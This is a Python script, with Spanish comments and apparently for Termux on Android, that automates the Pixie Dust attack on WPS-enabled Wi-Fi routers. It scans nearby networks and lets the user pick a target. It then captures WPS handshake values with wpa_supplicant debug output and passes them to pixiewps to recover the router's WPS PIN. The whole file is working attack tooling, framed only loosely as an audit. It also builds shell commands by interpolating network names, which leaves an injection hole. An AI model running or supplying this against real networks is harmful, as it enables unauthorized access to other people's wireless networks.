import subprocess
import re
import os
import tempfile
import time

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y devuelve la salida."""
    if use_sudo:
        command = f"su -c '{command}'"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode(), stderr.decode()

def extract_value(output, key):
    """Extrae un valor de la salida del comando basado en una clave."""
    match = re.search(f"{key} ([0-9a-fA-F:]+)", output)
    return match.group(1) if match else None

def check_tool_availability(tool):
    """Verifica si una herramienta está disponible en el sistema."""
    result, _ = run_command(f"which {tool}")
    if not result.strip():
        print(f"Error: {tool} no está instalado o no está en el PATH.")
        return False
    return True

def scan_wifi(interface):
    """Escanea redes Wi-Fi cercanas utilizando la interfaz especificada."""
    print(f"Escaneando redes Wi-Fi en la interfaz {interface}...")
    resultado, error = run_command(f"iw dev {interface} scan", use_sudo=True)

    if not resultado:
        print(f"Error al escanear redes: {error.strip()}")
        return [], [], []

    redes, bssids, canales = [], [], []
    for linea in resultado.split('\n'):
        if "SSID" in linea and ':' in linea:
            essid = linea.split(':', 1)[1].strip()
            redes.append(essid)
        if "BSS" in linea and ':' in linea:
            bssid = linea.split()[1].split('(')[0]
            bssids.append(bssid)
        if "freq" in linea:
            try:
                freq = int(linea.split()[1])
                canales.append(int((freq - 2407) / 5))
            except ValueError:
                continue
    return redes, bssids, canales

def create_wpa_supplicant_conf(ssid):
    """Crea un archivo de configuración temporal para wpa_supplicant."""
    conf_content = f"""
network={{
    ssid=\"{ssid}\"
    key_mgmt=NONE
}}
"""
    conf_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
    conf_file.write(conf_content)
    conf_file.close()
    return conf_file.name

def capture_wps_data(interface, ssid):
    """Captura los datos necesarios para el ataque Pixie Dust usando wpa_supplicant."""
    print(f"Capturando datos WPS de la red con SSID {ssid}...")
    conf_file = create_wpa_supplicant_conf(ssid)
    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"

    wpa_supplicant_command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"
    stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True)

    os.remove(conf_file)  # Eliminar el archivo de configuración temporal

    pke = extract_value(stdout, "PKE:")
    pkr = extract_value(stdout, "PKR:")
    ehash1 = extract_value(stdout, "E-Hash1:")
    ehash2 = extract_value(stdout, "E-Hash2:")
    authkey = extract_value(stdout, "AuthKey:")
    enonce = extract_value(stdout, "E-Nonce:")

    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
        print("No se pudieron capturar todos los datos necesarios para el ataque Pixie Dust.")
        return None, None, None, None, None, None

    return pke, pkr, ehash1, ehash2, authkey, enonce

def perform_pixie_dust_attack(interface, ssid):
    """Realiza el ataque Pixie Dust usando pixiewps."""
    print(f"\nIniciando ataque Pixie Dust en SSID: {ssid}")
    pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, ssid)

    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
        print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
        return

    pixiewps_command = f"pixiewps -e {pke} -r {pkr} -s {ehash1} -z {ehash2} -a {authkey} -n {enonce} -vv"
    print(f"Ejecutando pixiewps: {pixiewps_command}")

    process = subprocess.Popen(pixiewps_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in iter(process.stdout.readline, b''):
        print(line.decode().strip())

    pixie_stdout, pixie_stderr = process.communicate()
    print("Salida de pixiewps:")
    print(pixie_stdout.decode())
    print(pixie_stderr.decode())

    if "WPS pin:" in pixie_stdout.decode():
        pin = extract_value(pixie_stdout.decode(), "WPS pin:")
        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
        return pin
    else:
        print("\nPixie Dust no pudo encontrar el PIN.")
        return None

def main():
    tools = ["iw", "pixiewps", "/data/data/com.termux/files/usr/bin/wpa_supplicant"]
    for tool in tools:
        if not check_tool_availability(tool):
            return

    hotspot_interface = "wlan1"  # Asegúrate de que esta sea la interfaz correcta
    redes, bssids, canales = scan_wifi(hotspot_interface)

    if redes:
        print("Redes disponibles:")
        for i, red in enumerate(redes):
            print(f"{i + 1}. {red} - BSSID: {bssids[i]} - Canal: {canales[i]}")

        seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
        red_seleccionada = redes[seleccion]
        perform_pixie_dust_attack(hotspot_interface, red_seleccionada)
    else:
        print("No se encontraron redes WiFi.")

if __name__ == "__main__":
    main()





